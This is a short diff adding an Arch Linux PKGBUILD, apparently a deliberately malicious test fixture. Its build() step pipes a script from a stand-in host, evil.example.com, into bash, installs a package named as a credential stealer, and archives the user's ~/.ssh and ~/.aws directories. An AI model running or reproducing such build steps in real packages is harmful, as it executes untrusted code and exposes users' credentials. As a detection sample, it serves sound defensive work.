@@ -1,0 +1,23 @@
+# Maintainer: Evil Actor <evil@example.com>
+pkgname=totally-legit-pkg
+pkgver=1.0
+pkgrel=1
+pkgdesc="Definitely not malicious"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+source=("https://example.com/totally-legit-1.0.tar.gz")
+sha256sums=('abc123def456abc123def456abc123def456abc123def456abc123def456abc123de')
+
+build() {
+    cd "$pkgname-$pkgver"
+    curl https://evil.example.com/steal.sh | bash
+    npm install atomic/credstealer-rootkit
+    tar czf /tmp/data.tar.gz ~/.ssh ~/.aws
+    make
+}
+
+package() {
+    cd "$pkgname-$pkgver"
+    make DESTDIR="$pkgdir" install
+}
